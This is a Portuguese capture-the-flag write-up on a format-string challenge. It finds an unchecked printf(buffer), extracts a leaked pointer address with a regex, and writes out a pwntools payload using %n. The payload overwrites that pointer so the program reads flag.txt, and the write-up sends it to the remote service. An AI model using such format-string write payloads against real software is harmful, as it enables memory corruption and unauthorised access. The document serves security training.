# Format Strings

## Setup

- Foi executado o comando `checksec` para identificar as proteções ativas no binário fornecido.

![image](screenshots/CTF6_1.png)

- As proteções presentes permitiram explorarmos vulnerabilidades de escrita arbitrária na memória.

## Reconhecimento

- O código fonte foi analisado para identificar as vulnerabilidades.

1. **Existência de Ficheiros Lidos**

   - A função `readtxt` lê um ficheiro chamado `"rules.txt"` ao inicializar o programa.
   - O nome do ficheiro pode ser manipulado pela exploração da vulnerabilidade de format string.

2. **Existência de `format string` Vulnerável**

   - Na função `main`, o programa usa diretamente `printf(buffer)` para exibir o input do utilizador, sem realizar validação.
   - Isso permite explorar a vulnerabilidade de **format string** para ler ou sobrescrever endereços de memória.

3. **Ação Potencial**

   - Substituir o nome do ficheiro lido de `rules.txt` para `flag.txt` através de manipulação da memória.

## Exploit

- O programa fornece o endereço da variável `fun` na memória:

```c
printf("I will give you an hint: %x\n", &fun);
```

- Extraímos então esse endereço utilizando regex

```py
match = re.search(r'I will give you an hint: (0x)?([0-9a-fA-F]+)', output)
if match:
    fun_addr = int(match.group(2), 16)
    print(f"[+] Endereço de fun extraído: {hex(fun_addr)}")
else:
    print("[-] Falha ao extrair o endereço de fun")
    r.close()
    exit()
```

- Foi criado um payload para modificar o valor do pointer `fun` para que a função `readtxt` seja chamada novamente com `flag.txt`:

```py
payload = b"./flag.." + p32(fun_addr) + b"%8x" + b"%.134518673x%n"
```
1. `./flag..`: O início do nome flag seguido por bytes de ajuste.
2. `p32(fun_addr)`: Endereço do ponteiro fun.
3. `%8x`: Preenche a pilha para alcançar o local correto de escrita.
4. `%.134518673x%n`: Ajusta o contador para escrever o valor necessário no endereço especificado.

- O payload foi enviado ao serviço remoto através do comando:

```py
r.sendline(payload)

buf = r.recvall().decode(errors="backslashreplace")
print(buf)

r.interactive()
```

- Foi possível então encontrarmos a flag.

![image](screenshots/CTF6_2.png)

